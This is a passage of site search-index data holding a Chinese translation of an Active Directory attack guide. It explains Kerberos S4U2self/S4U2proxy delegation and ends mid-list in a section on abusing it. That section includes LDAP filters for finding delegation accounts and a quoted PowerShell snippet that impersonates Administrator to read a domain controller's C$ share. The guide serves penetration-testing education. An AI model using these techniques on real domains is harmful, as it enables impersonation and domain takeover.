Signature\uff08\u7531KDC\u5bc6\u94a5\u8fdb\u884c\u7b7e\u540d\uff09\u673a\u5236\uff0c\u4ee5\u9a8c\u8bc1ST\u662f\u5426\u906d\u5230\u4e86\u7be1\u6539\u3002</p> <p>\u6b64\u5916\uff0c\u60a8\u53ef\u80fd\u5df2\u7ecf\u6ce8\u610f\u5230\u4e86\uff1aS4U2proxy\u4f1a\u8fd4\u56de\u53ef\u8f6c\u53d1\u7684\u7968\u8bc1\u3002(\u5373\u4f7f\u5728Elad Shamir\u6307\u51fa\u8fd9\u4e00\u4e8b\u5b9e\u540e\uff0c\u76f8\u5173\u89c4\u8303\u5df2\u7ecf\u5f97\u5230\u66f4\u65b0\uff0c\u4f46\u81f3\u5c11\u4ece\u6211\u7684\u5b9e\u9a8c\u6765\u770b\uff0c\u60c5\u51b5\u4ecd\u7136\u5982\u6b64\u3002)</p> <p>\u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u6765\u4e3e\u4f8b\u8bf4\u660eS4U2proxy\u7684\u5904\u7406\u8fc7\u7a0b\u3002</p> <pre><code>            `KDC                 .---. &lt;-----2) TGS-REQ--------------------.                /   /|    + SPN: MSSQLSvc/dbsrv            |               .---. |    + TGT websrv$                    |               |   | '    + ST client &gt; http/websrv        |               |   |/                                      |               '---'  &gt;-----3) TGS-REP------------------.  |                        + ST client &gt; MSSQLSvc/dbsrv    v  ^                                                       .---.   ____                                               /   /|  |    | &gt;-----------1) AP-REQ---------------------&gt; .---. |  |____|     + ST client &gt; http/websrv               |   | '  /::::/                                             |   |/   client                                             '---'                                                       websrv                 .---.                                  v                /   /|                                  |               .---. |&lt;-----4) AP-REQ-------------------'               |   | '   + ST client &gt; MSSQLSvc/dbsrv               |   |/                '---'                 dbsrv`\n</code></pre> <p>S4U2proxy\u5904\u7406\u8fc7\u7a0b</p> <p>\u5ba2\u6237\u7aef\u901a\u8fc7\u53d1\u9001ST\u5bf9Web\u670d\u52a1\u5668\u670d\u52a1\uff08http/websrv\uff09\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u7a0d\u540e\uff0c\u5f53Web\u670d\u52a1\u5668\uff08http/websrv\uff09\u9700\u8981\u4ee3\u8868\u5ba2\u6237\u7aef\u8bbf\u95ee\u6570\u636e\u5e93\u670d\u52a1\uff08MSSQLSvc/dbsrv\uff09\u65f6\uff0c\u5b83\u5c06\u4f7f\u7528\u5ba2\u6237\u7aefST\u548c\u5b83\u81ea\u5df1\u7684TGT\u4e3aMSSQLSvc/dbsrv\u8bf7\u6c42\u4e00\u4e2aST\u3002</p> <p>KDC\u68c0\u67e5\u670d\u52a1\u7528\u6237websrv$\u662f\u5426\u80fd\u591f\u4e3aMSSQLSvc/dbsrv\u8bf7\u6c42\u59d4\u6d3e\u7968\u8bc1\uff08\u4e3b\u8981\u53c2\u8003\u524d\u9762\u8ba8\u8bba\u7684\u89c4\u5219\uff09\uff0c\u5e76\u8fd4\u56deMSSQLSVC/dbsrv\u7684\u5ba2\u6237\u7aefST\u3002\u603b\u800c\u8a00\u4e4b\uff0c\u901a\u5e38\u5e94\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\u4e4b\u4e00\uff1a</p> <ul> <li>MSSQLSvc/dbsrv\u5305\u542b\u5728websrv$(Web\u670d\u52a1\u5668\u7684\u670d\u52a1\u7528\u6237\uff09\u7684msDS-AllowedToDelegateTo\u5c5e\u6027\u4e2d\u3002\u8fd9\u662f\u5178\u578b\u7684\u7ea6\u675f\u59d4\u6d3e\u3002</li> <li>websrv$\u5305\u542b\u5728dbsrv$\uff08MSSQLSvc/dbsrv\u670d\u52a1\u7684\u670d\u52a1\u7528\u6237\uff09\u7684msDS-AllowedToActOnBehalfOfOtherIdentity\u5c5e\u6027\u4e2d\u3002\u8fd9\u662f\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e\u3002</li> <li>Web\u670d\u52a1\u4f7f\u7528\u6700\u8fd1\u83b7\u5f97\u7684ST\u901a\u8fc7\u5192\u5145\u5ba2\u6237\u7aef\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002</li> </ul> <p>\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u8de8\u57df\u4f7f\u7528S4U2proxy\uff0c\u4f46\u662f\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ea\u80fd\u4f7f\u7528\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e\u3002</p> <pre><code>                                              `KDC foo.com        .--------------1) TGS-REQ-------------------&gt; .---.        |          + SPN: MSSQLSvc/dbsrv.bar.com     /   /|        |          + TGT websrv$ &gt; foo.com          .---. |        |          + ST client &gt; http/websrv        |   | '        |                                           |   |/         |   .----2) TGS-REP-----------------------&lt; '---'          |   |  + TGT websrv$ (client) &gt; bar.com     ^   v        ^   v                                       |   |         .---.                                      |   |        /   /| &gt;----3) TGS-REQ----------------------'   |       .---. |      + SPN: krbtgt/bar.com               |       |   | '      + TGT websrv$ &gt; foo.com             |       |   |/                                           |       '---'   &lt;-----4) TGS-REP-------------------------'       websrv        + TGT websrv$ &gt; bar.com                      .---.     (foo.com)                                                   /   /|       ^  v  v                                                  .---. |       |  |  '-------------7) AP-REQ--------------------------&gt; |   | '       |  |          + ST client &gt; MSSQLSvc/dbsrv.bar.com       |   |/        |  |                                                     '---'         |  '-------5) TGS-REQ-----------------------&gt; .---.      dbsrv       |      + SPN: MSSQLSvc/dbsrv.bar.com         /   /|    (bar.com)       |      + TGT websrv$ &gt; bar.com              .---. |       |      + TGT websrv$ (client) &gt; bar.com     |   | '       |                                           |   |/        '---6) TGS-REP----------------------------&lt; '---'           + ST client &gt; MSSQLSvc/dbsrv.bar.com   KDC bar.com`\n</code></pre> <p>\u8de8\u57dfS4u2proxy</p> <p><code>\u6211\u4eec\u5047\u8bbe\u5ba2\u6237\u7aef\u5df2\u7ecf\u5c06\u5176ST\u53d1\u9001\u5230websrv\u670d\u52a1\u3002\u7136\u540ewebsrv\u9700\u8981\u4ee5\u7528\u6237\u7684\u540d\u4e49\u6765\u8bbf\u95ee\u6570\u636e\u5e93\u670d\u52a1MSSQLSvc/dbsrv\u3002 websrv\u4ee5\u5ba2\u6237\u7aef\u7684\u540d\u4e49\u8981\u6c42\u4e3aMSSQLSvc/dbsrv\u63d0\u4f9bST\uff0c\u5176\u4e2d\u5305\u62ec\u5b83\u81ea\u5df1\u7684ST\u3002 KDC\u68c0\u67e5\u8be5\u8bf7\u6c42\u5e76\u786e\u5b9a\u6240\u8bf7\u6c42\u7684\u670d\u52a1\u5c31\u5728bar.com\u4e2d\uff0c\u8fd9\u65f6\uff0c\u5b83\u8fd4\u56de\u4e00\u4e2a\u7279\u6b8a\u7684\u8de8\u57dfTGT\uff0c\u7528\u4e8e\u5411bar.com KDC\u8bf7\u6c42S4U2proxy\u3002 websrv\u68c0\u67e5\u8be5\u54cd\u5e94\u5e76\u53d1\u73b0\u4e86\u7528\u4e8eS4U2proxy\u7684\u8fd9\u4e2a\u7279\u6b8a\u7684\u57df\u95f4TGT\u3002\u4f46\u5b83\u8fd8\u9700\u8981\u4e00\u4e2a\u7528\u4e8ebar.com\u7684\u5e38\u89c4\u8de8\u57dfTGT\uff0c\u56e0\u6b64\u5b83\u4f1a\u5411KDC\u8bf7\u6c42\u4e00\u4e2a\u3002 KDC\u4e3awebsrv$\u8fd4\u56de\u4e00\u4e2a\u7528\u4e8ebar.com\u7684\u8de8\u57dfTGT\u3002 \u7136\u540ewebsrv$\u4f7f\u7528\u8fd9\u4e9b\u57df\u95f4TGT\u6765\u4ee5\u5ba2\u6237\u7aef\u7684\u540d\u4e49\u5411bar.com KDC\u8bf7\u6c42\u4e00\u4e2aMSSQLSvc/dbsrv\u7684ST\u3002 KDC\u68c0\u67e5\u8fd9\u4e9b\u8bf7\u6c42\u540e\u53d1\u73b0websrv$\u88ab\u5141\u8bb8\u59d4\u6d3e\u7ed9MSSQLSvc/dbsrv\u670d\u52a1\uff08\u4f7f\u7528RBCD\uff09\uff0c\u6240\u4ee5\uff0c\u5b83\u4f1a\u4e3aMSSQLSvc/dbsrv\u9881\u53d1ST\u3002 websrv\u4f7f\u7528\u8fd9\u4e2a\u65b0\u7684ST\u6765\u5192\u5145\u5ba2\u6237\u8bbf\u95eeMSSQLSvc/dbsrv\u670d\u52a1\u3002</code></p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#s4u2self","title":"S4U2self","text":"<p>Kerberos S4U2self\u6269\u5c55\u5141\u8bb8\u4e00\u4e2a\u670d\u52a1\u4ee5\u7528\u6237\u7684\u540d\u4e49\u4e3a\u81ea\u5df1\u8bf7\u6c42\u4e00\u4e2a\u7968\u8bc1\uff0c\u5e76\u5728S4U2proxy\u4e2d\u4f7f\u7528\u3002\u8fd9\u6837\u505a\u7684\u76ee\u7684\uff0c\u662f\u4e3a\u4e86\u8ba9\u90a3\u4e9b\u4e0d\u652f\u6301Kerberos\u534f\u8bae\u7684\u5ba2\u6237\u7aef\u80fd\u591f\u6267\u884cKerberos\u59d4\u6d3e\u3002\u8fd9\u4e5f\u88ab\u79f0\u4e3a\u534f\u8bae\u8f6c\u6362\u3002</p> <p>\u4e3a\u4e86\u80fd\u591f\u4f7f\u7528S4U2self\uff0cKDC\u4f1a\u68c0\u67e5\u670d\u52a1\u7528\u6237\u5e10\u6237\u7684UserAccountControl TRUSTED_TO_AUTH_FOR_DELEGATION\u6807\u5fd7\u3002\u4e3a\u4e86\u4fee\u6539\u8fd9\u4e2a\u6807\u5fd7\uff0c\u9700\u8981SeEnableDelegationPrivilege\u6743\u9650\u3002</p> <p>\u6b64\u5916\uff0cKDC\u8fd8\u68c0\u67e5\u670d\u52a1\u7528\u6237\u662f\u5426\u5177\u6709\u4efb\u4f55\u670d\u52a1\u4ee5\u53camsDS-AllowedToDelegateTo\u5c5e\u6027\u7684\u503c\u3002\u5177\u4f53\u89c4\u5219\u53ef\u4ee5\u53c2\u9605MS-SFU\u89c4\u8303\uff0c\u4e0b\u9762\u7b80\u5355\u4ecb\u7ecdKDC\u5728\u6536\u5230S4U2self\u8bf7\u6c42\u65f6\u8fdb\u884c\u7684\u68c0\u67e5\uff1a</p> <p><code>\u5982\u679c\u670d\u52a1\u7528\u6237\u6ca1\u6709\u4efb\u4f55\u670d\u52a1 =&gt; \u8fd4\u56de\u9519\u8befKDC-ERR-S-PRINCIPAL-UNKNOWN\u3002 \u5982\u679c\u5ba2\u6237\u7aef\u65e0\u6cd5\u6267\u884c\u59d4\u6d3e =&gt; \u8fd4\u56denon-FORWARDABLE ST\u3002 \u5982\u679c\u670d\u52a1\u7528\u6237\u7684TRUSTED_TO_AUTH_FOR_DELEGATION\u6807\u5fd7\u88ab\u8bbe\u7f6e =&gt; \u8fd4\u56deFORWARDABLE ST\u3002 \u5982\u679c\u670d\u52a1\u7528\u6237\u7684TRUSTED_TO_AUTH_FOR_DELEGATION\u6807\u5fd7\u6ca1\u6709\u8bbe\u7f6e\uff0c\u5e76\u4e14\u670d\u52a1\u7528\u6237\u5728ms-AllowedToDelegateTo\u4e2d\u6709\u670d\u52a1 =&gt; \u8fd4\u56denon-FORWARDABLE ST\u3002\uff08\u8fd9\u4e2aST\u4ecd\u7136\u53ef\u4ee5\u7528\u4e8eS4U2proxy\u4e0e\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e\uff09 \u5982\u679c\u670d\u52a1\u7528\u6237\u7684TRUSTED_TO_AUTH_FOR_DELEGATION\u6807\u5fd7\u6ca1\u6709\u8bbe\u7f6e\uff0c\u5e76\u4e14\u670d\u52a1\u7528\u6237\u7684ms-AllowedToDelegateTo\u662f\u7a7a\u7684 =&gt; \u8fd4\u56deFORWARDABLE ST\u3002</code></p> <p>\u4e0b\u9762\uff0c\u8ba9\u6211\u4eec\u4e3e\u4f8b\u8bf4\u660e\uff1a</p> <pre><code>                                                            `KDC                           .---. &gt;---2) TGS-REQ--------------&gt;  .---.                          /   /|     + SPN: HTTP/websrv        /   /|   ____                  .---. |     + For user: client       .---. |  |    | &gt;-1) SPNEGO--&gt;  |   | '     + TGT websrv$            |   | '  |____|     (NTLM)      |   |/                               |   |/   /::::/                 '---'  &lt;----3) TGS-REP-------------&lt; '---'    client                websrv   + ST client &gt; HTTP/websrv`\n</code></pre> <p>S4U2self\u7684\u5904\u7406\u8fc7\u7a0b</p> <p><code>\u7531\u4e8eHTTP/websrv\u670d\u52a1\u4e0d\u652f\u6301Kerberos\u534f\u8bae\uff0c\u6240\u4ee5\u5ba2\u6237\u7aef\u5c06\u901a\u8fc7NTLM\uff08\u6216\u5176\u4ed6\u8ba4\u8bc1\u534f\u8bae\uff09\u5bf9\u5176\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 websrv\u901a\u8fc7\u5411KDC\u53d1\u9001TGS-REQ\u6765\u4e3a\u5ba2\u6237\u7aef\u8bf7\u6c42S4U2self ST\u3002 KDC\u5c06\u68c0\u67e5\u8fd9\u4e9b\u8bf7\u6c42\u3001websrv$\u7684TRUSTED_TO_AUTH_FOR_DELEGATION\u6807\u5fd7\u4ee5\u53ca\u5ba2\u6237\u7aef\u662f\u5426\u53d7\u5230\u4fdd\u62a4\u800c\u65e0\u6cd5\u8fdb\u884c\u59d4\u6d3e\u3002\u5982\u679c\u4e00\u5207\u6b63\u5e38\uff0cKDC\u5c06\u4e3a\u5ba2\u6237\u7aef\u8fd4\u56de\u4e00\u4e2aHTTP/websrv ST\uff0c\u8fd9\u4e2aST\u53ef\u80fd\u662fFORWARDABLE\uff0c\u4e5f\u53ef\u80fd\u4e0d\u662f\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u524d\u9762\u63d0\u5230\u7684\u53d8\u91cf\u3002</code></p> <p>\u6b64\u5916\uff0cS4U2Self\u8fd8\u53ef\u4ee5\u8de8\u57df\u4f7f\u7528\u3002\u4e0b\u9762\uff0c\u8ba9\u6211\u4eec\u770b\u770b\u8fd9\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u3002</p> <pre><code>                                                       `____                                                                  |    |                                    .-----1) SPNEGO------&lt; |____|                                    |       (NTLM)         /::::/                                    |                   client (bar)                                    |                                    |   foo KDC                          v                                    bar KDC    .---. &lt;----2) TGS-REQ------&lt;  .---. &gt;---------4) TGS-REQ------------&gt;  .---.   /   /|  + SPN: krbtgt/bar     /   /|        + SPN: HTTP/websrv         /   /|  .---. |  + TGT websrv$ &gt; foo  .---. |        + For user: client        .---. |  |   | '                       |   | '        + TGT websrv$ &gt; bar       |   | '  |   |/                        |   |/                                   |   |/   '---'  &gt;-----3) TGS-REP-----&gt; '---'  &lt;----------5) TGS-REP-----------&lt; '---'    v   ^   + TGT websrv$ &gt; bar  websrv    + TGT websrv$ (client) &gt; foo  |   |                         (foo)  |   |                         v   ^  |   |                         |   |  |   '--&lt;&lt;--6) TGS-REQ---&lt;&lt;----'   |                    |  + SPN: HTTP/websrv             |   |  + For user: client             |       |  + TGT websrv$ (client) &gt; foo   |  |                                 |  '-----&gt;&gt;---7) TGS-REP----&gt;&gt;-------'                    + ST client &gt; HTTP/websrv`\n</code></pre> <p>S4U2self\u7684\u8de8\u57df\u4f7f\u7528</p> <p><code>\u7531\u4e8eHTTP/websrv\u670d\u52a1\u4e0d\u652f\u6301Kerberos\u534f\u8bae\uff0c\u6240\u4ee5\u5ba2\u6237\u7aef\u5c06\u901a\u8fc7NTLM\uff08\u6216\u5176\u4ed6\u8ba4\u8bc1\u534f\u8bae\uff09\u5bf9\u5176\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 websrv\u53d1\u73b0\u5ba2\u6237\u7684\u9886\u57df\uff08realm\uff09\u662fbar\uff0c\u6240\u4ee5\uff0c\u5b83\u5c06\u53d1\u9001\u4e86\u4e00\u4e2aTGS-REQ\uff0c\u8981\u6c42\u83b7\u5f97bar\u9886\u57df\u7684TGT\u3002 KDC\u5411websrv\u8fd4\u56de\u4e00\u4e2abar\u7684\u57df\u95f4TGT\u3002 websrv\u4f7f\u7528\u5176\u65b0\u7684\u57df\u95f4TGT\u5411bar KDC\u8bf7\u6c42\u4e3a\u5ba2\u6237\u7aef\u63d0\u4f9b\u4e00\u4e2aHTTP/websrv ST\u3002 bar KDC\u53d1\u73b0HTTP/websrv\u670d\u52a1\u4f4d\u4e8efoo\u57df\u5185\uff0c\u6240\u4ee5\uff0c\u5b83\u65e0\u6cd5\u4e3aHTTP/websrv\u670d\u52a1\u9881\u53d1ST\uff0c\u4f46\u4f1a\u8fd4\u56de\u4e00\u4e2afoo\u57df\u7684\u5f15\u8350TGT\uff0c\u8868\u660e\u4e3a\u5ba2\u6237\u7aef\u7533\u8bf7\u4e86HTTP/websrv ST\u3002 \u7136\u540e\uff0cwebsrv\u4f7f\u7528bar KDC\u9881\u53d1\u7684\u8fd9\u4e2a\u5f15\u8350TGT\u6765\u5411foo KDC\u8bf7\u6c42\u4e3a\u5ba2\u6237\u7aef\u63d0\u4f9bST\u3002 foo KDC\u68c0\u67e5\u8be5\u8bf7\u6c42\u548c\u5f15\u8350TGT\u540e\uff0c\u8ba4\u4e3a\u53ef\u4ee5\u4e3a\u5ba2\u6237\u7aef\u9881\u53d1HTTP/websrv ST\u3002</code></p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#s4u2self-and-s4u2proxy","title":"S4U2self and S4U2proxy","text":"<p>\u73b0\u5728\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053S4U2self\u548cS4U2proxy\u662f\u5982\u4f55\u5de5\u4f5c\u7684\u4e86\uff0c\u4e0b\u9762\uff0c\u8ba9\u6211\u4eec\u4e3e\u4f8b\u8bf4\u660e\u5982\u4f55\u5c06\u5b83\u4eec\u7ec4\u5408\u8d77\u6765\u4f7f\u7528\u3002</p> <pre><code>                                              `KDC    .------&gt;&gt;----1) TGS-REQ-----&gt;&gt;---------------&gt; .---.    |            + SPN: HTTP/websrv               /   /|    |            + For user: admin               .---. |    |            + TGT websrv$                   |   | '    |                                            |   |/     |   .--&lt;&lt;----2) TGS-REP-----&lt;&lt;-------------&lt; '---'      |   |        + ST admin &gt; HTTP/websrv        ^   v    |   |                                        |   |    |   |                                        |   |    ^   v                                        |   |    .---. &gt;-&gt;&gt;---3) TGS-REQ-----&gt;&gt;---------------'   |   /   /|        + SPN: MSSQLSvc/dbsrv               |  .---. |        + TGT websrv$                       |  |   | '        + ST admin &gt; HTTP/websrv            |  |   |/                                             |  '---'  &lt;--&lt;&lt;---4) TGS-REP-----&lt;&lt;-------------------'  websrv         + ST admin &gt; MSSQLSvc/dbsrv    v    |    |                                      .---.    |                                     /   /|    '------------5) AP-REQ-------------&gt; .---. |        + ST admin &gt; MSSQLSvc/dbsrv      |   | '                                         |   |/                                          '---'                                           dbsrv`\n</code></pre> <p>S4U2self\u4e0eS4U2proxy\u7684\u7ec4\u5408\u5e94\u7528</p> <p><code>websrv\u901a\u8fc7TGS-REQ\u4f7f\u7528S4U2self\u5411KDC\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42\uff0c\u8981\u6c42\u4e3a\u7528\u6237admin\u8fd4\u56de\u4e00\u4e2aHTTP/websrv ST\u3002 KDC\u68c0\u67e5\u8fd9\u4e9b\u8bf7\u6c42\u3001websrv$ TRUSTED_TO_AUTH_FOR_DELEGATION\u6807\u5fd7\u4ee5\u53ca\u7528\u6237admin\u662f\u5426\u56e0\u53d7\u5230\u4fdd\u62a4\u800c\u65e0\u6cd5\u6267\u884c\u59d4\u6d3e\u3002\u5982\u679c\u4e00\u5207\u6b63\u5e38\uff0cKDC\u5c06\u4e3a\u5ba2\u6237\u7aef\u8fd4\u56de\u4e00\u4e2aHTTP/websrv ST\uff0c\u8fd9\u4e2aST\u53ef\u80fd\u662fFORWARDABLE\u7684\uff0c\u4e5f\u53ef\u80fd\u4e0d\u662f\uff0c\u5177\u4f53\u53d6\u51b3\u4e8eS4U2Self\u4e2d\u63d0\u5230\u7684\u53d8\u91cf\u3002 \u7136\u540e\uff0cwebsrv\u901a\u8fc7S4U2self ST\u548c\u5b83\u81ea\u5df1\u7684TGT\uff0c\u4ee5admin\u7684\u540d\u4e49\u6765\u8bf7\u6c42MSSQLSvc/dbsrv ST\u3002 KDC\u5c06\u6839\u636eS4U2Proxy\u4e2d\u63d0\u5230\u7684\u89c4\u5219\uff0c\u68c0\u67e5\u670d\u52a1\u7528\u6237websrv$\u662f\u5426\u88ab\u5141\u8bb8\u4e3aMSSQLSvc/dbsrv\u8bf7\u6c42\u59d4\u6d3e\u7968\u8bc1\u3002\u5982\u679c\u4e00\u5207\u6b63\u5e38\uff0c\u5c31\u4f1a\u4e3aadmin\u7528\u6237\u8fd4\u56de\u4e00\u4e2aMSSQLSvc/dbsrv ST\u3002 websrv\u4f7f\u7528MSSQLSvc/dbsrv ST\uff0c\u4ee5admin\u7684\u540d\u4e49\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002</code></p> <p>\u56e0\u6b64\uff0c\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u53ef\u4ee5\u5c06S4U2self\u548cS4U2proxy\u7ec4\u5408\u8d77\u6765\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u9488\u5bf9\u6240\u6709\u90a3\u4e9b\u670d\u52a1\u7528\u6237\u88ab\u5141\u8bb8\u6267\u884c\u7ea6\u675f\u59d4\u6d3e\u670d\u52a1\uff0c\u8fdb\u800c\u5192\u5145\u4efb\u4f55\u7528\u6237\uff08\u90a3\u4e9b\u65e0\u6cd5\u6267\u884c\u59d4\u6d3e\u7684\u7528\u6237\u9664\u5916\uff09\u3002</p> <p>\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u8de8\u57df\u4f7f\u7528S4U2self\u548cS4U2proxy\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#s4u-attacks","title":"S4U attacks","text":"<p>\u8ba9\u6211\u4eec\u8003\u5bdf\u4e00\u4e0b\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u7ea6\u675f\u59d4\u6d3e\u548cS4U\u6269\u5c55\u662f\u5982\u4f55\u88ab\u6ee5\u7528\u7684\u3002</p> <p>\u4e3a\u4e86\u627e\u5230\u4f7f\u7528\u7ea6\u675f\u59d4\u6d3e\u7684\u8d26\u6237\uff0c\u5fc5\u987b\u67e5\u627e\u542f\u7528\u4e86UserAccountControl TRUSTED_TO_AUTH_FOR_DELEGATION\u7684\u8d26\u6237\uff08S4U2self/Protocol Transition\uff09\uff0c\u6216\u8005\u5728\u5c5e\u6027msDS-AllowedToDelegateTo\uff08Classic Constrained Delegation\uff09\u6216msDS-AllowedToActOnBehalfOfOtherIdentity\uff08RBCD\uff09\u4e2d\u5e26\u6709\u503c\u7684\u8d26\u6237\u3002\u4e0b\u9762\u7ed9\u51fa\u4e86\u4e00\u4e2aLDAP\u8fc7\u6ee4\u5668\uff0c\u53ef\u4ee5\u7528\u6765\u641c\u7d22\u7ea6\u675f\u59d4\u6d3e\u8d26\u6237\uff1a</p> <p><code>(|   (UserAccountControl:1.2.840.113556.1.4.803:=16777216)   (msDS-AllowedToDelegateTo=*)   (msDS-AllowedToActOnBehalfOfOtherIdentity=*) )</code></p> <p>\u68c0\u7d22\u4e0e\u7ea6\u675f\u59d4\u6d3e\u6709\u5173\u7684\u8d26\u6237\u7684LDAP\u8fc7\u6ee4\u5668</p> <p>\u4e3a\u4e86\u627e\u5230\u4e0e\u7ea6\u675f\u59d4\u6d3e\u76f8\u5173\u7684\u8d26\u6237\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528Powerview\u7b49\u5de5\u5177\uff0cimpacket findDelegation.py\u811a\u672c\uff0cPowershell ActiveDirectory\u6a21\u5757\u6216ldapsearch\u3002</p> <p><code>(|   (memberof:1.2.840.113556.1.4.1941:=CN=Protected Users,CN=Users,DC=&lt;domain&gt;,DC=&lt;dom&gt;)   (userAccountControl:1.2.840.113556.1.4.803:=1048576) )</code></p> <p>\u68c0\u7d22\u65e0\u6cd5\u6267\u884c\u59d4\u6d3e\u7684\u8d26\u6237\u7684LDAP\u8fc7\u6ee4\u5668</p> <p>\u4e00\u65e6\u627e\u5230\u4e86\u76f8\u5e94\u7684\u8d26\u6237\u5e76\u60f3\u6267\u884c\u67d0\u4e9bKerberos\u64cd\u4f5c\uff0c\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u501f\u52a9\u5404\u79cd\u5de5\u5177\uff0c\u901a\u8fc7S4U\u6269\u5c55\u6267\u884c\u7968\u8bc1\u8bf7\u6c42\uff0c\u4ece\u800c\u83b7\u53d6\u7528\u4e8e\u5192\u5145\u7528\u6237\u6240\u9700\u7684ST\u3002\u6b64\u5916\uff0c\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528MIT\u7684kerberos\u5de5\u5177\uff08ktutitl, kinit, kvno\uff09\uff0cRubeus\uff0cgetST.py impacket\u811a\u672c\u6216cerbero\u3002</p> <p>\u6b64\u5916\uff0c\u53ea\u8981\u80fd\u591f\u5728\u4e00\u53f0\u652f\u6301\u7ea6\u675f\u59d4\u6d3e\u7684\u8ba1\u7b97\u673a\u4e0a\u4ee5SYSTEM\u8d26\u6237\u7684\u8eab\u4efd\uff08\u4e5f\u5c31\u662f\u5728Active Directory\u4e2d\u7684\u8ba1\u7b97\u673a\u8d26\u6237\u7684\u80cc\u666f\u4e0b\uff09\u6267\u884c\u547d\u4ee4\uff0c\u5c31\u80fd\u591f\u4f7f\u7528S4U2self\u548cS4U2proxy\uff0c\u4e3a\u6b64\uff0c\u53ea\u9700\u8981\u51e0\u884cPowershell\u4ee3\u7801\u5373\u53ef\u3002</p> <p><code># Code made by Lee Christensen (@tifkin_) and Will Schroeder (@harmj0y) # Source: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/  # translated from the C# example at https://msdn.microsoft.com/en-us/library/ff649317.aspx  # load the necessary assembly $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')  # execute S4U2Self w/ WindowsIdentity to request a forwardable TGS for the specified user $Ident = New-Object System.Security.Principal.WindowsIdentity @('Administrator@FOO.LOCAL')  # actually impersonate the next context $Context = $Ident.Impersonate()  # implicitly invoke S4U2Proxy with the specified action ls \\\\DC01.FOO.LOCAL\\C$  # undo the impersonation context $Context.Undo()</code></p> <p>\u7ea6\u675f\u59d4\u6d3e\u7684\u4f18\u70b9\u662f\uff0c\u5728\u5f88\u591a\uff08\u6bd4\u5982\u542f\u7528\u4e86RBCD\u6216TrustedToAuthForDelegation\uff09\u65f6\u5019\uff0c\u53ef\u4ee5\u5728\u6ca1\u6709\u4efb\u4f55\u4e92\u52a8\u7684\u60c5\u51b5\u4e0b\u5192\u5145\u7528\u6237\u3002\u7136\u800c\uff0c\u7531\u4e8e\u60a8\u80fd\u8bbf\u95ee\u7684\u670d\u52a1\u6570\u91cf\u662f\u6709\u9650\u7684\uff0c\u5fc5\u987b\u4e86\u89e3\u5728\u6267\u884c\u59d4\u6d3e\u8fc7\u7a0b\u4e2d\u975e\u5e38\u6709\u7528\u7684\u654f\u611f\u670d\u52a1\uff1a</p> <ul> <li>\u57df\u63a7\u5236\u5668\u7684LDAP\uff1a Active Directory\u7684LDAP\u670d\u52a1\u662f\u7528\u6765\u7ba1\u7406\u8d26\u6237\u7684\uff0c\u5305\u62ec\u76f8\u5e94\u7684\u6743\u9650\uff0c\u6240\u4ee5\u53ea\u8981\u60a8\u80fd\u591f\u5192\u5145\u7ba1\u7406\u5458\u6765\u8bbf\u95eeLDAP\u670d\u52a1\uff0c\u5c31\u53ef\u4ee5\u5c06\u4efb\u4f55\u7279\u6743\u6388\u4e88\u60a8\u63a7\u5236\u7684\u4efb\u4f55\u7528\u6237\u5e10\u6237\u3002\u6bd4\u5982\uff0c\u901a\u8fc7\u6388\u4e88\u4efb\u610f\u6743\u9650\u6765\u53d1\u7684DCSync\u653b\u51fb\u5e76\u5165\u4fb5\u57df\u3002</li> <li>\u4efb\u4f55\u8ba1\u7b97\u673a\u7684SMB\uff1a \u5982\u679c\u80fd\u591f\u5192\u5145\u4efb\u4f55\u7528\u6237\u4f7f\u7528\u8ba1\u7b97\u673a\u7684SMB\uff08SPN\u4e2d\u7684cifs\uff09\u670d\u52a1\uff0c\u5c31\u53ef\u4ee5\u8bbf\u95ee\u8ba1\u7b97\u673a\u4e2d\u7684\u6240\u6709\u6587\u4ef6\uff0c\u901a\u8fc7psexec\u7b49\u5de5\u5177\u6267\u884c\u547d\u4ee4\uff0c\u4ee5\u53ca\u901a\u8fc7RPC\u8c03\u7528\u6267\u884c\u5176\u4ed6\u64cd\u4f5c\u3002</li> <li>MSSQL\u670d\u52a1\uff1a 